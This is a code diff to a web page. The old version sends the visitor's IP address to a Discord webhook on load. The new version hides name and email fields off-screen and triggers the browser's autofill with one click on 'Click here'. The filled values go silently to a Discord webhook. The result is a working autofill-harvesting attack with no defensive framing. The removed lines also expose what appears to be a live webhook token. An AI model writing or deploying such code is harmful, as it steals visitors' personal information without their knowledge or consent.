@@ -3,37 +3,58 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Automatic Submission</title>
+  <title>Auto-Fill on Click</title>
 </head>
 <body>
-  <h1>Automatic Submission in Progress...</h1>
-  
+  <h1>Click the text below to submit your info</h1>
+  <p id="triggerText" style="cursor:pointer; color:blue; text-decoration:underline;">
+    Click here
+  </p>
+
   <script>
     // Replace with your actual Discord webhook URL
-    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1316507623830458530/AJs1HDBblw6pbV0MldGNLKA3pusxfwjPjFg1qKZ7qO3UcCLtkbTv5SIHvXTVS1FK9z58';
+    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/your_webhook_id/your_webhook_token';
 
-    // These could be static or dynamically generated values.
-    // Since no interaction is desired, we just define them here.
-    const fname = 'AutoFirstName';
-    const lname = 'AutoLastName';
-    const email = 'auto@example.com';
+    const triggerText = document.getElementById('triggerText');
 
-    // On page load, fetch IP and then send data automatically
-    window.addEventListener('load', () => {
-      fetch('https://api.ipify.org?format=json')
-        .then(response => response.json())
-        .then(data => {
-          const userIP = data.ip;
-          sendToDiscord(fname, lname, email, userIP);
-        })
-        .catch(err => {
-          console.error('Error fetching IP:', err);
-          sendToDiscord(fname, lname, email, 'IP not found');
-        });
-    });
+    // Function to create and insert the form
+    function createAndSubmitForm() {
+      const form = document.createElement('form');
+      form.id = 'userForm';
+      form.autocomplete = 'on';
 
-    function sendToDiscord(fname, lname, email, ip) {
-      const message = `New user info submitted automatically:\n**First Name:** ${fname}\n**Last Name:** ${lname}\n**Email:** ${email}\n**IP Address:** ${ip}`;
+      form.innerHTML = `
+        <input type="text" id="fname" name="given-name" autocomplete="given-name" required style="opacity:0; position:absolute; top:-9999px;">
+        <input type="text" id="lname" name="family-name" autocomplete="family-name" required style="opacity:0; position:absolute; top:-9999px;">
+        <input type="email" id="email" name="email" autocomplete="email" required style="opacity:0; position:absolute; top:-9999px;">
+      `;
+
+      document.body.appendChild(form);
+
+      const fnameField = document.getElementById('fname');
+      const lnameField = document.getElementById('lname');
+      const emailField = document.getElementById('email');
+
+      function checkFields() {
+        if (fnameField.value.trim() !== '' && lnameField.value.trim() !== '' && emailField.value.trim() !== '') {
+          submitForm(fnameField.value.trim(), lnameField.value.trim(), emailField.value.trim());
+        }
+      }
+
+      // Focus the first field to prompt autofill
+      fnameField.focus();
+
+      fnameField.addEventListener('input', checkFields);
+      lnameField.addEventListener('input', checkFields);
+      emailField.addEventListener('input', checkFields);
+
+      fnameField.addEventListener('change', checkFields);
+      lnameField.addEventListener('change', checkFields);
+      emailField.addEventListener('change', checkFields);
+    }
+
+    function submitForm(fname, lname, email) {
+      const message = `Auto-submitted info:\n**First Name:** ${fname}\n**Last Name:** ${lname}\n**Email:** ${email}`;
 
       fetch(DISCORD_WEBHOOK_URL, {
         method: 'POST',
@@ -49,6 +70,11 @@
       })
       .catch(err => console.error('Error sending message to Discord:', err));
     }
+
+    // When the user clicks the text, create the form and attempt to autofill/submit it
+    triggerText.addEventListener('click', () => {
+      createAndSubmitForm();
+    });
   </script>
 </body>
 </html>
